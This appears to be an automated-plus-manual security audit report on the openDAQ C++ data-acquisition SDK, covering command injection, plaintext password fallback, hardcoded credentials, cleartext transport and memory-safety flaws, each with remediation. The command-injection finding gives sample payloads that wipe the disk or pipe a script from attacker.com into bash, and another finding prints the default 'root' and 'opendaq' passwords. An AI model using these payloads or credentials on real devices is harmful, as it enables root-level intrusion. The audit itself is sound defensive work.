# openDAQ Security Analysis Report

**Project**: openDAQ SDK (C++ Data Acquisition Framework)
**Date**: 2026-03-30
**Analyzer**: QE Security Scanner v3 (SAST / Manual Code Review)
**Scope**: core/, shared/, modules/, bindings/, simulator/, examples/ (~2,192 C++/H files)
**Classification**: COMPREHENSIVE -- SAST pattern analysis with deep manual code review

---

## Executive Summary

| Metric | Value |
|---|---|
| **Overall Risk Score** | **7.2 / 10 (HIGH)** |
| **CRITICAL Findings** | 4 |
| **HIGH Findings** | 8 |
| **MEDIUM Findings** | 9 |
| **LOW Findings** | 6 |
| **Total Findings** | 27 |
| **Files Analyzed** | ~2,192 |

openDAQ is a C++ SDK for networked data acquisition with native streaming, OPC UA, and mDNS discovery. The project has a substantial attack surface due to network-facing services with authentication, dynamic module loading, and command execution. The most critical findings involve **OS command injection via unsanitized user input passed to `popen()`/`system()`**, **plaintext password fallback in the authentication provider**, **hardcoded credentials in production simulator code**, and **cleartext credential transmission** over the native streaming protocol. The project lacks binary hardening flags (no stack canaries, no ASLR enforcement, no FORTIFY_SOURCE) in CMake, compounding the impact of any memory corruption vulnerability.

Positive observations: bcrypt is used for password hashing (when hashes are properly formatted); the reference counting system uses proper atomic operations; network protocol handlers include payload size validation and bounds checking; `shared_ptr`/`weak_ptr` patterns are used extensively in the networking layer to prevent use-after-free.

---

## Findings by Severity

---

### CRITICAL (CVSS 9.0-10.0)

---

#### SEC-001: OS Command Injection via Unsanitized Network Configuration Input

**CVSS Score**: 9.8 (Critical)
**CWE**: CWE-78 (OS Command Injection)
**OWASP**: A03:2021 -- Injection

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/examples/modules/ref_device_module/src/ref_device_impl.cpp` lines 632-647
- `/workspaces/cf-devpod/tmp/opendaq/examples/modules/ref_device_module/src/ref_device_impl.cpp` lines 668-673
- `/workspaces/cf-devpod/tmp/opendaq/simulator/simulator_app/src/main.cpp` line 21

**Description**:
User-controlled property values (`ifaceName`, `address4`, `address6`, `gateway4`, `gateway6`) are concatenated directly into shell command strings and passed to `popen()` and `std::system()` without any sanitization or escaping. These properties are set via the openDAQ configuration protocol, meaning a remote authenticated client can inject arbitrary shell commands.

**Affected Code** (ref_device_impl.cpp:632-647):
```cpp
const std::string scriptWithParams = "/home/opendaq/netplan_manager.py verify " +
                                     ifaceName.toStdString() + " " +
                                     (dhcp4 ? "true" : "false") + " " +
                                     (dhcp6 ? "true" : "false") + " " +
                                     "\"" + address4.toStdString() + "\" " +
                                     "\"" + address6.toStdString() + "\" " +
                                     "\"" + gateway4.toStdString() + "\" " +
                                     "\"" + gateway6.toStdString() + "\"";

const std::string command = "sudo python3 " + scriptWithParams + " 2>&1";
FILE* pipe = popen(command.c_str(), "r");
```

The `ifaceName`, `address4/6`, and `gateway4/6` values come from `StringPtr` properties that a remote client sets via the config protocol. A malicious value like `"; rm -rf / #` or `$(curl attacker.com/shell.sh | bash)` achieves arbitrary command execution **as root** (commands run via `sudo`).

Similarly, `main.cpp:21` runs `std::system("sudo python3 /home/opendaq/netplan_manager.py apply")` -- while static, it demonstrates that the subprocess infrastructure executes with root privileges.

**Impact**: Full remote code execution as root on the DAQ device from any authenticated user.

**Remediation**:
1. Replace `popen()`/`system()` with direct process spawning (e.g., `posix_spawn()`, `boost::process`) passing arguments as an array, never through a shell.
2. Validate `ifaceName` against a whitelist of allowed interface names (regex: `^[a-zA-Z0-9_-]+$`).
3. Validate IP address and gateway strings against strict IP address format regexes before use.
4. Apply principle of least privilege -- avoid `sudo` where possible.

---

#### SEC-002: Plaintext Password Fallback in Authentication Provider

**CVSS Score**: 9.1 (Critical)
**CWE**: CWE-261 (Weak Encoding for Password), CWE-522 (Insufficiently Protected Credentials)
**OWASP**: A07:2021 -- Identification and Authentication Failures

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/core/coreobjects/src/authentication_provider_impl.cpp` lines 85-91

**Description**:
The `isPasswordValid()` method falls back to a **direct plaintext comparison** when the stored hash does not match the bcrypt regex pattern. This means if a user's password hash field contains a plaintext string (or any string not matching `^\$(2[ayb]?)\$[0-9]+\$[a-zA-Z0-9\.\/]{53}$`), authentication silently degrades to comparing the user-supplied password directly against it.

**Affected Code**:
```cpp
bool AuthenticationProviderImpl::isPasswordValid(const std::string& hash, const StringPtr& password)
{
    if (std::regex_match(hash, BcryptRegex))
        return BCrypt::validatePassword(password, hash);

    return hash == password;  // CRITICAL: plaintext fallback
}
```

**Impact**: Any misconfiguration, data migration error, or intentional abuse where the password field is not a valid bcrypt hash results in plaintext password storage and comparison. Credentials stored in JSON config files could be in plaintext and still function, creating a false sense of security. The comparison is also vulnerable to timing side-channel attacks.

**Remediation**:
1. Remove the plaintext fallback entirely. If the hash does not match the expected format, reject authentication unconditionally.
2. Log a security warning when a non-bcrypt hash is encountered.
3. Use a constant-time comparison function if any fallback is retained.

---

#### SEC-003: Hardcoded Production Credentials with Known Passwords

**CVSS Score**: 9.0 (Critical)
**CWE**: CWE-798 (Use of Hard-coded Credentials)
**OWASP**: A07:2021 -- Identification and Authentication Failures

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/simulator/simulator_app/src/main.cpp` lines 28-29

**Description**:
The simulator application (which runs as a production-like device service, as evidenced by the systemd restart comment on line 59) contains hardcoded bcrypt hashes with the passwords documented in source code comments. These are real deployed credentials.

**Affected Code**:
```cpp
users.pushBack(User("opendaq", "$2b$10$bqZWNEd.g1R1Q1inChdAiuDr5lbal33bBNOehlCwuWcxRH5weF3hu")); // password: opendaq
users.pushBack(User("root", "$2b$10$k/Tj3yqFV7uQz42UCJK2n.4ECd.ySQ2Sfd81Kx.xfuMOeluvA/Vpy", {"admin"})); // password: root
```

**Impact**: Any deployed simulator device uses well-known credentials. The `root` user with password `root` has the `admin` group, providing full administrative access. Anonymous authentication is also enabled (`StaticAuthenticationProvider(true, users)`) on line 30, meaning no credentials are needed at all.

**Remediation**:
1. Move credentials to an external configuration file with restricted file permissions.
2. Require password change on first setup.
3. Remove plaintext password comments from source code.
4. Disable anonymous authentication by default in production builds.
5. Generate unique default credentials per device instance.

---

#### SEC-004: Cleartext Credential Transmission over Native Streaming Protocol

**CVSS Score**: 9.0 (Critical)
**CWE**: CWE-319 (Cleartext Transmission of Sensitive Information), CWE-523 (Unprotected Transport of Credentials)
**OWASP**: A02:2021 -- Cryptographic Failures

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/shared/libraries/native_streaming_protocol/src/native_streaming_client_handler.cpp` lines 542-550
- `/workspaces/cf-devpod/tmp/opendaq/shared/libraries/native_streaming_protocol/src/native_streaming_server_handler.cpp` lines 199-241

**Description**:
The native streaming protocol transmits username and password in cleartext (Basic authentication). The client reads the password from a property object and passes it directly to the `Authentication` object which is sent over the network. There is no TLS/SSL layer in the native streaming protocol -- no TLS-related code exists anywhere in the native_streaming_protocol library or its external dependency.

**Affected Code** (client_handler.cpp:542-550):
```cpp
Authentication NativeStreamingClientImpl::initClientAuthenticationObject(const PropertyObjectPtr& authenticationObject)
{
    const StringPtr username = authenticationObject.getPropertyValue("Username");
    const StringPtr password = authenticationObject.getPropertyValue("Password");
    if (username.getLength() == 0)
        return Authentication();
    return Authentication(username, password);
}
```

Server side (server_handler.cpp:227):
```cpp
UserPtr user = authProvider.authenticate(authentication.getUsername(), authentication.getPassword());
```

**Impact**: Network eavesdroppers can capture plaintext credentials. On shared networks (common in industrial/DAQ environments), this enables credential theft and unauthorized device access.

**Remediation**:
1. Implement TLS for all native streaming connections. This is the most critical networking improvement.
2. As a secondary measure, implement a challenge-response authentication mechanism (e.g., SCRAM) so passwords are never sent in cleartext even without TLS.
3. Until TLS is available, document the risk prominently and recommend network isolation.

---

### HIGH (CVSS 7.0-8.9)

---

#### SEC-005: No Authentication Rate Limiting or Brute Force Protection

**CVSS Score**: 8.1 (High)
**CWE**: CWE-307 (Improper Restriction of Excessive Authentication Attempts)
**OWASP**: A07:2021 -- Identification and Authentication Failures

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/core/coreobjects/src/authentication_provider_impl.cpp` lines 27-38
- `/workspaces/cf-devpod/tmp/opendaq/shared/libraries/native_streaming_protocol/src/native_streaming_server_handler.cpp` lines 199-241

**Description**:
The authentication provider has no rate limiting, account lockout, or backoff mechanism. Failed authentication attempts are logged at WARNING level but no counter is maintained. An attacker can perform unlimited brute force attempts against the native streaming or config protocol endpoints.

**Impact**: Given the weak default passwords (SEC-003), unlimited brute force attacks are trivially successful.

**Remediation**:
1. Implement per-IP and per-account rate limiting with exponential backoff.
2. Add account lockout after N failed attempts with configurable threshold.
3. Log failed authentication attempts at a sufficient level for monitoring.

---

#### SEC-006: Unsafe strcpy Operations in JSON Deserialization

**CVSS Score**: 7.5 (High)
**CWE**: CWE-120 (Buffer Copy without Checking Size of Input), CWE-676 (Use of Potentially Dangerous Function)
**OWASP**: A06:2021 -- Vulnerable and Outdated Components (usage patterns)

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/core/coretypes/src/json_deserializer_impl.cpp` lines 170, 204, 243
- `/workspaces/cf-devpod/tmp/opendaq/core/opendaq/utility/src/device_update_options_impl.cpp` line 41

**Description**:
Multiple locations use `strcpy()` to copy data into allocated buffers. While the buffer sizes are computed based on the source string length, the use of `strcpy()` provides no overflow protection if the length calculation is incorrect or if the source data changes between length measurement and copy (TOCTOU). The code uses `getLength()` and `getCharPtr()` as separate operations on IString objects.

**Affected Code** (json_deserializer_impl.cpp:170):
```cpp
char* buffer = new(std::nothrow) char[length + 1 + dataPaddingSize * 2];
// ...
strcpy(&buffer[dataPaddingSize], ptr);
```

If the length returned by `getLength()` does not match the actual null-terminated length of the string returned by `getCharPtr()`, or if the underlying string is modified between calls, a buffer overflow occurs.

**Impact**: Potential heap buffer overflow leading to code execution, especially since this operates on deserialized data from the network (JSON from config protocol).

**Remediation**:
1. Replace all `strcpy()` with `strncpy()` or `std::memcpy()` with explicit length bounds.
2. Use a single operation to get both the pointer and length atomically.
3. Consider using `std::string` or `std::string_view` throughout instead of raw C strings.

---

#### SEC-007: Format String Vulnerability in Error Reporting

**CVSS Score**: 7.5 (High)
**CWE**: CWE-134 (Use of Externally-Controlled Format String)

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/core/coretypes/include/coretypes/ctutils.h` lines 132-137

**Description**:
The error message formatting in `ctutils.h` passes `message.c_str()` as the format string to `sprintf_s`/`snprintf`. If the `message` parameter contains user-controlled content with format specifiers (%s, %n, %x), this becomes a format string vulnerability.

**Affected Code**:
```cpp
char errorMsg[1024];
#if defined(__STDC_SECURE_LIB__) || defined(__STDC_LIB_EXT1__)
    sprintf_s(errorMsg, sizeof(errorMsg) / sizeof(char), message.c_str(), params...);
#else
    snprintf(errorMsg, sizeof(errorMsg) / sizeof(char), message.c_str(), params...);
#endif
```

The `message` parameter is a `std::string_view` that in many call sites originates from error messages constructed with data from the config protocol or property values.

**Impact**: Stack-based buffer read/write, information disclosure, or potential code execution via `%n` format specifier.

**Remediation**:
1. Migrate error formatting to use `fmt::format()` (already a project dependency) which is type-safe and immune to format string attacks.
2. Never pass user-controlled strings as printf-family format strings.

---

#### SEC-008: Unchecked Buffer Copies with strcpy in Audio Device Module

**CVSS Score**: 7.5 (High)
**CWE**: CWE-120 (Buffer Copy without Checking Size of Input)

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/examples/modules/audio_device_module/src/miniaudio_utils.cpp` lines 96, 100, 104

**Description**:
The `std::strcpy()` calls copy a `std::string` (`id.c_str()`) into fixed-size device ID character arrays without any length validation. The miniaudio device ID structures have fixed-size buffers (e.g., `coreaudio` is 256 bytes, `alsa` is 256 bytes, `pulse` is 256 bytes).

**Affected Code** (miniaudio_utils.cpp:96):
```cpp
std::strcpy(deviceId.coreaudio, id.c_str());
// ...
std::strcpy(deviceId.alsa, id.c_str());
// ...
std::strcpy(deviceId.pulse, id.c_str());
```

The `id` string originates from a device ID that could be influenced by mDNS discovery responses or user configuration.

**Impact**: Stack or heap buffer overflow if a crafted device ID exceeds the target buffer size.

**Remediation**:
1. Replace `strcpy` with `strncpy(deviceId.coreaudio, id.c_str(), sizeof(deviceId.coreaudio) - 1)` and ensure null termination.
2. Validate `id` string length before the copy.

---

#### SEC-009: Missing Binary Hardening in Build System

**CVSS Score**: 7.4 (High)
**CWE**: CWE-693 (Protection Mechanism Failure)

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/CMakeLists.txt` (entire file -- security flags absent)
- `/workspaces/cf-devpod/tmp/opendaq/cmake/` (no security-related cmake modules)

**Description**:
The CMake build system does not enable any standard binary hardening flags. Searches for `-fstack-protector`, `-D_FORTIFY_SOURCE`, `-fPIE`, `-Wformat-security`, `RELRO`, `NXCOMPAT`, `DYNAMICBASE`, `SAFESEH`, `-Wall`, `-Wextra`, or `-Werror` in the cmake directory and root CMakeLists.txt returned no results except a single `-fPIC` in the Arrow external dependency. The compiler warning flags (`-Wall -Wextra`) are not set in any cmake file owned by openDAQ.

The `opendaq_setup_compiler_flags` function is called at line 372 but is defined in an externally-fetched cmake-utils package, meaning security configuration is delegated to an external dependency.

**Impact**: All buffer overflows, format string bugs, and other memory corruption issues are more easily exploitable without:
- Stack canaries (`-fstack-protector-strong`)
- Source fortification (`-D_FORTIFY_SOURCE=2`)
- Position-independent executables (`-fPIE -pie`)
- Full RELRO (`-Wl,-z,relro,-z,now`)
- Non-executable stack marking

**Remediation**:
1. Add to the top-level CMakeLists.txt:
```cmake
if (CMAKE_COMPILER_IS_GNUCXX OR CMAKE_CXX_COMPILER_ID MATCHES "Clang")
    add_compile_options(-fstack-protector-strong -D_FORTIFY_SOURCE=2 -fPIE -Wformat -Wformat-security)
    add_link_options(-pie -Wl,-z,relro,-z,now)
endif()
```
2. Enable compiler warnings: `-Wall -Wextra -Wpedantic -Wconversion`
3. For MSVC builds, ensure `/GS /DYNAMICBASE /NXCOMPAT /SAFESEH` are active.

---

#### SEC-010: Environment Variable Module Path Injection

**CVSS Score**: 7.3 (High)
**CWE**: CWE-426 (Untrusted Search Path), CWE-427 (Uncontrolled Search Path Element)

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/core/opendaq/modulemanager/src/module_manager_impl.cpp` lines 186-206

**Description**:
The module manager reads `OPENDAQ_MODULES_PATH` from the environment to override the module search directories. A local attacker who can control environment variables can cause the application to load arbitrary shared libraries from attacker-controlled directories. The loaded modules execute with the application's full privileges, and there is no signature verification unless `authenticatedModulesOnly` is explicitly configured (which defaults to `false` on line 53).

**Affected Code**:
```cpp
auto envPath = std::getenv("OPENDAQ_MODULES_PATH");
if (envPath != nullptr)
{
    // Modules are loaded from this attacker-controlled path
    // ...
    while (std::getline(ss, token, sep))
        paths.push_back(token);
}
```

**Impact**: Arbitrary code execution via malicious shared library loading.

**Remediation**:
1. Validate and sanitize the `OPENDAQ_MODULES_PATH` value (absolute paths only, no symlinks to unsafe locations).
2. Enable module authentication by default.
3. Consider removing environment variable override in production builds.

---

#### SEC-011: Integer Truncation in Protocol Payload Size Handling

**CVSS Score**: 7.2 (High)
**CWE**: CWE-190 (Integer Overflow or Wraparound), CWE-681 (Incorrect Conversion between Numeric Types)

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/shared/libraries/config_protocol/src/config_protocol.cpp` lines 14, 114, 168
- `/workspaces/cf-devpod/tmp/opendaq/shared/libraries/packet_streaming/src/packet_streaming_server.cpp` lines 159, 360, 401

**Description**:
Payload sizes are computed as `size_t` (64-bit on most platforms) but truncated to `uint32_t` via `static_cast`. While there are `MAX_PACKET_BUFFER_SIZE` checks in some paths, multiple code paths perform the truncation before or without the size check.

**Affected Code** (config_protocol.cpp:14):
```cpp
buffer->payloadSize = static_cast<uint32_t>(payloadSize);
```

If `payloadSize` exceeds `UINT32_MAX`, the truncation wraps and the header advertises a small payload while more data is written, potentially causing heap overflow in receivers.

**Impact**: Memory corruption in protocol handlers that trust the payload size header field.

**Remediation**:
1. Add explicit range checks before all `static_cast<uint32_t>(payloadSize)` operations.
2. Use a helper function that throws on overflow.

---

#### SEC-012: Conditional Thread Safety Creates Data Races

**CVSS Score**: 7.0 (High)
**CWE**: CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization)

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/core/coretypes/include/coretypes/utility_sync.h` lines 23-43
- `/workspaces/cf-devpod/tmp/opendaq/core/opendaq/signal/include/opendaq/connection_impl.h` lines 27-29, 74-87, 111-113

**Description**:
Thread safety is controlled by a compile-time macro `OPENDAQ_THREAD_SAFE`. When disabled (or if different translation units are compiled with different settings), the mutex type resolves to `NoLockMutex` which has empty `lock()`/`unlock()` methods. The connection queue, which is accessed from multiple threads (producer/consumer pattern), completely loses synchronization.

**Affected Code** (utility_sync.h):
```cpp
#ifndef OPENDAQ_THREAD_SAFE
class NoLockMutex {
public:
    void lock() {};
    void unlock() {};
};
typedef NoLockMutex mutex;
#else
typedef std::mutex mutex;
#endif
```

**Impact**: Data races, memory corruption, and undefined behavior when `OPENDAQ_THREAD_SAFE` is disabled or inconsistently defined across compilation units.

**Remediation**:
1. Always enable thread safety in production builds.
2. Replace the compile-time toggle with a runtime configuration or remove the option entirely.
3. Add checks to ensure `OPENDAQ_THREAD_SAFE` is consistently defined across all translation units.

---

### MEDIUM (CVSS 4.0-6.9)

---

#### SEC-013: TOCTOU Race Condition in CSV Filename Generation

**CVSS Score**: 6.5 (Medium)
**CWE**: CWE-367 (Time-of-Check Time-of-Use)

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/examples/modules/basic_csv_recorder_module/src/basic_csv_recorder_signal.cpp` lines 30-57

**Description**:
The code contains a documented TOCTOU race condition (acknowledged in a `@todo` comment at line 30): the filename uniqueness check (`fs::exists()`) and file creation are not atomic. Two concurrent recorders can select the same filename and overwrite each other.

**Impact**: Data loss through file overwrite; potential symlink attacks if an attacker creates a symlink at the predicted filename between the existence check and the file creation.

**Remediation**:
1. Use `O_CREAT | O_EXCL` flags for atomic file creation.
2. Use a UUID or random component in filenames.

---

#### SEC-014: Anonymous Authentication Enabled by Default in Simulator

**CVSS Score**: 6.5 (Medium)
**CWE**: CWE-287 (Improper Authentication)

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/simulator/simulator_app/src/main.cpp` line 30

**Description**:
The simulator application creates a `StaticAuthenticationProvider(true, users)` with the first parameter `true` enabling anonymous access. This means any client can connect without any credentials and interact with the device.

**Impact**: Unauthorized access to DAQ device configuration, signal data, and network settings.

**Remediation**: Set anonymous authentication to `false` by default.

---

#### SEC-015: User Enumeration via Authentication Error Messages

**CVSS Score**: 5.3 (Medium)
**CWE**: CWE-203 (Observable Discrepancy)

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/core/coreobjects/src/authentication_provider_impl.cpp` lines 28-35

**Description**:
The authentication provider returns different error messages for "user not found" versus "password for user is invalid". This allows attackers to enumerate valid usernames.

**Affected Code**:
```cpp
if (!user.assigned())
    return DAQ_MAKE_ERROR_INFO(OPENDAQ_ERR_AUTHENTICATION_FAILED, "user not found");
// ...
if (!isPasswordValid(hash, password))
    return DAQ_MAKE_ERROR_INFO(OPENDAQ_ERR_AUTHENTICATION_FAILED, "password for user is invalid");
```

**Impact**: Attackers can determine valid usernames to focus brute force attacks.

**Remediation**: Return a generic "authentication failed" message for both cases.

---

#### SEC-016: Unsafe `new char[]` Without nullptr Check in Python Binding

**CVSS Score**: 5.0 (Medium)
**CWE**: CWE-252 (Unchecked Return Value), CWE-789 (Memory Allocation with Excessive Size Value)

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/bindings/python/core_types/include/py_core_types/py_queued_event_handler_impl.h` line 73

**Description**:
Memory is allocated with `new char[str1.size() + 1]` (not `new(std::nothrow)`) which will throw `std::bad_alloc` on failure. While this is generally acceptable in C++, the immediate `std::strcpy` following it uses an unbounded copy. The pattern of `new` followed by `strcpy` throughout the Python bindings layer does not validate the string size.

**Impact**: Potential denial of service through memory exhaustion; the strcpy is safe only if the new succeeds with the correct size.

**Remediation**: Use `std::string` or `daqDuplicateCharPtr()` (the project's own safe string duplication function) consistently.

---

#### SEC-017: No Input Validation on JSON Configuration Files

**CVSS Score**: 5.0 (Medium)
**CWE**: CWE-20 (Improper Input Validation), CWE-502 (Deserialization of Untrusted Data)

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/core/coreobjects/src/authentication_provider_impl.cpp` lines 200-215
- `/workspaces/cf-devpod/tmp/opendaq/core/opendaq/opendaq/src/json_config_provider_impl.cpp` line 47

**Description**:
JSON configuration files and authentication files are read and parsed without schema validation. The `readJsonFile` method reads an entire file into memory and parses it. No maximum file size is enforced, and no JSON schema validation ensures the document structure is valid beyond basic type checks on individual fields.

**Impact**: Denial of service via extremely large JSON files; unexpected behavior from malformed configuration.

**Remediation**:
1. Enforce maximum file size limits.
2. Implement JSON schema validation.
3. Set resource limits on the rapidjson parser.

---

#### SEC-018: Password Hashes Stored in Serialized User Objects

**CVSS Score**: 5.0 (Medium)
**CWE**: CWE-312 (Cleartext Storage of Sensitive Information)

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/core/coreobjects/src/user_impl.cpp` line 88

**Description**:
User objects serialize their password hash field via the standard serialization mechanism. When users are serialized (e.g., for config protocol transmission, logging, or persistence), the bcrypt hash is included. While bcrypt hashes are resistant to reversal, exposing them unnecessarily increases attack surface.

**Impact**: Password hashes exposed in serialized data, logs, or network traffic could be subjected to offline brute force attacks.

**Remediation**: Exclude password hashes from serialization. If needed for synchronization, use a separate secure channel.

---

#### SEC-019: Unchecked `static_cast` in Protocol Version Parsing

**CVSS Score**: 5.0 (Medium)
**CWE**: CWE-125 (Out-of-bounds Read)

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/shared/libraries/config_protocol/src/config_protocol.cpp` lines 213-225

**Description**:
The protocol info reply parser reads `verCount` from a network packet and then iterates `verCount` times, reading `uint16_t` values from the payload. While there is a minimum size check (`payloadSize < sizeof(uint16_t) + sizeof(uint16_t)`), it does not validate that `verCount * sizeof(uint16_t) + 4 <= payloadSize`, allowing a crafted packet with a large `verCount` to cause an out-of-bounds read.

**Affected Code** (config_protocol.cpp:221-225):
```cpp
auto payload = static_cast<uint16_t*>(getPayload());
currentVersion = *payload++;
const size_t verCount = *payload++;
for (size_t i = 0; i < verCount; i++)
    supportedVersions.insert(*payload++);  // No bounds check against payloadSize
```

**Impact**: Out-of-bounds heap read, information disclosure, potential crash.

**Remediation**: Add validation: `if ((verCount * sizeof(uint16_t) + 2 * sizeof(uint16_t)) > getPayloadSize()) throw ...;`

---

#### SEC-020: Potential Memory Leak in JSON Deserialization Error Path

**CVSS Score**: 4.5 (Medium)
**CWE**: CWE-401 (Missing Release of Memory after Effective Lifetime)

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/core/opendaq/utility/src/device_update_options_impl.cpp` lines 36-59

**Description**:
Memory is allocated with `new char[...]` and freed with `delete[] buffer` on the normal path. However, if `read()` on line 56 throws an exception, the buffer is leaked. The `internalAddRef()` on line 53 followed by the potential throw on line 57 also complicates reference counting.

**Impact**: Memory leak under error conditions, potential denial of service over time.

**Remediation**: Use `std::unique_ptr<char[]>` (as done correctly in `json_deserializer_impl.cpp` lines 197 and 236) instead of raw `new`/`delete`.

---

#### SEC-021: mDNS Service Discovery Without Authentication

**CVSS Score**: 4.3 (Medium)
**CWE**: CWE-306 (Missing Authentication for Critical Function)

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/shared/libraries/discovery/include/daq_discovery/mdnsdiscovery_client.h`
- `/workspaces/cf-devpod/tmp/opendaq/core/opendaq/modulemanager/src/mdns_discovery_server_impl.cpp`

**Description**:
The mDNS discovery mechanism broadcasts and accepts device information on the local network without any authentication or integrity verification. A malicious device on the same network segment can advertise itself as a legitimate DAQ device, leading clients to connect to it.

**Impact**: Device spoofing, man-in-the-middle attacks on the local network, data exfiltration.

**Remediation**:
1. Implement device identity verification after discovery (e.g., via certificates).
2. Allow users to configure trusted device lists.
3. Document the risk of untrusted network segments.

---

### LOW (CVSS 0.1-3.9)

---

#### SEC-022: Test Credentials in Non-Test Integration Code

**CVSS Score**: 3.7 (Low)
**CWE**: CWE-798 (Use of Hard-coded Credentials)

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/tests/integration/test_opendaq_device_modules/test_native_device_modules.cpp` lines 228-342
- `/workspaces/cf-devpod/tmp/opendaq/examples/applications/cpp/client_authentication/client_authentication.cpp` line 20
- `/workspaces/cf-devpod/tmp/opendaq/docs/tests/test_howto_access_control.cpp` line 65

**Description**:
Multiple test and example files contain hardcoded passwords like `"jure123"`, `"tomaz123"`, `"wrongPass"`, `"root"`, `"opendaq123"`. While these are in test code, the example applications serve as templates that developers copy for production use.

**Impact**: Developers copying example code may deploy systems with these known passwords.

**Remediation**: Use placeholder values like `"<your-password-here>"` in examples, with prominent comments to change them.

---

#### SEC-023: sprintf with Fixed-Size Stack Buffer in Error Formatting

**CVSS Score**: 3.5 (Low)
**CWE**: CWE-121 (Stack-based Buffer Overflow)

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/core/coretypes/include/coretypes/ctutils.h` line 132

**Description**:
A 1024-byte stack buffer is used with `sprintf_s`/`snprintf` for error messages. While `snprintf` truncates, `sprintf_s` on Windows may invoke an invalid parameter handler on overflow. The fixed size limits error message length and could truncate important diagnostic information.

**Impact**: Limited -- buffer overflow is prevented by `snprintf`/`sprintf_s`, but truncation may hide diagnostic information.

**Remediation**: Use `fmt::format()` which dynamically allocates.

---

#### SEC-024: SHA1 Usage in Module Authenticator

**CVSS Score**: 3.0 (Low)
**CWE**: CWE-328 (Use of Weak Hash)

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/examples/applications/cpp/licensing_example/src/module_authenticator_impl_win.cpp` line 147

**Description**:
The Windows module authenticator uses SHA1 certificate hashes (via `CERT_HASH_PROP_ID`). While this is a Windows API limitation for certificate identification (not for security-critical hashing), SHA1 is considered cryptographically weak.

**Impact**: Low -- used for certificate identification, not for security-critical operations. However, certificate collision attacks on SHA1 are practical.

**Remediation**: Where possible, use SHA-256 based certificate properties.

---

#### SEC-025: Broad Exception Catching in Network Handlers

**CVSS Score**: 2.5 (Low)
**CWE**: CWE-755 (Improper Handling of Exceptional Conditions)

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/shared/libraries/native_streaming_protocol/src/native_streaming_client_handler.cpp` lines 178, 193
- `/workspaces/cf-devpod/tmp/opendaq/shared/libraries/native_streaming_protocol/src/native_streaming_server_handler.cpp` lines 171, 189

**Description**:
Generic `catch (const std::exception& e)` blocks in the streaming protocol handlers log warnings but continue execution. This could mask security-relevant errors such as authentication failures, protocol violations, or memory corruption indicators.

**Impact**: Security-relevant errors may be silently ignored, allowing degraded security states.

**Remediation**: Log at ERROR level for unexpected exceptions in protocol handlers and consider disconnecting the session.

---

#### SEC-026: Inconsistent Null Pointer Validation

**CVSS Score**: 2.0 (Low)
**CWE**: CWE-476 (NULL Pointer Dereference)

**Location**:
- Throughout `core/coretypes/src/intfs.cpp`, `core/coreobjects/src/` (multiple files)

**Description**:
While the project uses `OPENDAQ_PARAM_NOT_NULL()` macro in many public API functions, some internal helper functions and code paths do not validate pointers before dereferencing. The macro itself is controlled by the `OPENDAQ_ENABLE_PARAMETER_VALIDATION` CMake option which can be disabled.

**Impact**: Null pointer dereferences causing crashes (denial of service).

**Remediation**: Enable parameter validation unconditionally in production builds.

---

#### SEC-027: External Dependencies with Known Vulnerability Surface

**CVSS Score**: 2.0 (Low -- depends on versions)
**CWE**: CWE-1104 (Use of Unmaintained Third-Party Components)

**Location**:
- `/workspaces/cf-devpod/tmp/opendaq/external/` directory

**Description**:
The project vendors several third-party libraries including rapidjson, boost, miniaudio, spdlog, fmt, and others. These are included as source or fetched at build time. Without a dependency tracking mechanism, it is difficult to verify that all vendored libraries are at their latest security-patched versions. Notably:
- RapidJSON has had past heap overflow vulnerabilities
- Boost components have periodic security advisories
- miniaudio is a large single-header library (~93K lines) with its own string handling

**Impact**: Inherited vulnerabilities from outdated dependencies.

**Remediation**:
1. Maintain a software bill of materials (SBOM) with pinned versions.
2. Set up automated dependency scanning (e.g., OSV, Dependabot).
3. Regularly update vendored libraries.

---

## Security Architecture Assessment

### Strengths

1. **BCrypt password hashing**: The authentication system uses bcrypt ($2b$ variant) for password hashing when properly configured, which is a strong choice for password storage.

2. **Reference counting with atomics**: The core object system (`intfs.h`) uses `std::atomic_fetch_add_explicit` and `std::atomic_fetch_sub_explicit` with appropriate memory orderings (`relaxed` for add, `acq_rel` for release), following the correct pattern for thread-safe reference counting.

3. **Payload size validation in protocol handlers**: The native streaming protocol validates payload sizes against `MAX_PAYLOAD_SIZE` before processing (base_session_handler.cpp:243-246, 380-382), and the config protocol validates packet buffer sizes against `MAX_PACKET_BUFFER_SIZE` (config_protocol.cpp:107).

4. **Bounds checking in data copy operations**: The `copyData()` and `getStringFromData()` functions in base_session_handler.cpp (lines 255-282) perform explicit bounds validation before memcpy operations.

5. **Connection limit enforcement**: The server handler tracks configuration connections and can reject clients when limits are reached (native_streaming_server_handler.h:139-144).

6. **Access control system**: The project has a permission management system with role-based access control (PermissionManagerImpl), supporting read/write/execute permission levels per user/group.

### Weaknesses

1. **No transport encryption**: The native streaming protocol and config protocol have no TLS layer. All data, including credentials, is transmitted in cleartext.

2. **Compile-time security toggles**: Thread safety (`OPENDAQ_THREAD_SAFE`) and parameter validation (`OPENDAQ_ENABLE_PARAMETER_VALIDATION`) can be disabled at compile time, silently removing security protections.

3. **Shell command execution pattern**: The pattern of building shell commands from user input and executing via `popen()`/`system()` is fundamentally unsafe and should be replaced with direct process spawning.

